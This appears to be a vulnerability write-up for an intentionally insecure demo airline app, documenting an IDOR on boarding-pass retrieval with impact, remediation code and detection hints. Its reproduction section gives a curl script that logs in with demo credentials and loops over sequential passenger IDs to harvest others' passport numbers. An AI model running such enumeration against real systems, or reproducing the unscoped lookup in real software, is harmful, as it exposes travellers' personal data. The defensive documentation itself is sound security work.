# VULN-071 — IDOR on boarding-pass retrieval

| Field | Value |
|-------|-------|
| ID | VULN-071 |
| Domain | checkin |
| CWE | CWE-639 (Authorization Bypass Through User-Controlled Key) |
| OWASP Top 10 (2021) | A01:2021 – Broken Access Control |
| Severity | High |
| Location | `backend/app/routers/checkin.py:162-187` (`get_boarding_pass`), sink at line 172 |
| Introduced by | Workstream 5 — Check-in & Travel Documents |

## Description

`GET /api/checkin/{pnr}/boarding-pass/{passenger_id}` authenticates the caller with
`Depends(current_user)` but performs **no object-level authorisation**:

```python
boarding = db.scalar(select(BoardingPass).where(BoardingPass.passenger_id == passenger_id))
```

Three checks are missing:

1. The boarding pass is looked up by `passenger_id` alone — the `{pnr}` path segment is
   accepted, logged, and then ignored, so a mismatched PNR still returns a record.
2. There is no comparison between `CheckinReservation.owner_email` and `user.email`.
3. `passenger_id` is a sequential integer primary key, so the whole passenger population is
   trivially enumerable (`for id in 1..N`).

The response body includes `passenger_name`, `document_number` (passport) and the
`qr_payload` that embeds the passport number — see VULN-072 — so the two findings compound
into a bulk PII disclosure.

## Reproduction

```bash
login() { curl -s -X POST http://127.0.0.1:8000/api/auth/login -H 'Content-Type: application/json' \
  -d "{\"email\":\"$1\",\"password\":\"Iberia2026!\"}" | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])'; }

VICTIM=$(login frequent@iberia.demo)     # owns PNR QR9B4L
ATTACKER=$(login customer@iberia.demo)   # owns PNR XK7T2P only

# the victim checks in normally
curl -s -X POST http://127.0.0.1:8000/api/checkin/QR9B4L -H "Authorization: Bearer $VICTIM" \
  -H 'Content-Type: application/json' -d '{}'

# the attacker reads the victim's boarding pass, quoting their own PNR
curl -s "http://127.0.0.1:8000/api/checkin/XK7T2P/boarding-pass/3" \
  -H "Authorization: Bearer $ATTACKER"

# ...and sweeps the whole flight
for id in $(seq 1 50); do
  curl -s "http://127.0.0.1:8000/api/checkin/XK7T2P/boarding-pass/$id" \
    -H "Authorization: Bearer $ATTACKER"; echo
done
```

Expected insecure result: `200 OK` with `"pnr": "QR9B4L"` — another traveller's record,
including their passport number — returned to a caller who has no relationship to it.

## Blast radius

Any authenticated account (self-service registration is enough) can harvest the name, seat,
flight, gate, sequence number, barcode and passport/national-ID number of every checked-in
passenger by iterating one integer. That is enough for boarding-pass forgery, targeted
social engineering of the contact centre, and a reportable GDPR incident.

## Intended remediation

* Scope the query by PNR **and** verify ownership:
  ```python
  boarding = db.scalar(
      select(BoardingPass).where(
          BoardingPass.passenger_id == passenger_id, BoardingPass.pnr == pnr.upper()
      )
  )
  reservation = db.get(CheckinReservation, pnr.upper())
  if user.role == "customer" and reservation.owner_email != user.email:
      raise HTTPException(403, "Not your reservation")
  ```
* Return `404` (not `403`) for records the caller may not see, so the endpoint does not
  confirm existence.
* Introduce a reusable `require_reservation_access(pnr)` dependency so every check-in route
  enforces the same rule, and cover it with a negative test.
* Consider opaque, unguessable identifiers (UUIDs) for passengers instead of sequential ints
  as defence in depth.

## Detection hints

* Grep: `select(BoardingPass).where(BoardingPass.passenger_id ==` with no `owner_email` /
  `user.email` in the same function; more generally, any handler that takes both a scope
  identifier and an object identifier but filters on only one.
* Logs: `iberia.checkin` logs `boarding pass retrieved` with `requested_pnr` and
  `boarding_pass_pnr` — any line where those two differ is an exploited IDOR.
* Test assertion: `backend/tests/test_checkin.py::test_vuln_071_idor_on_boarding_pass`.
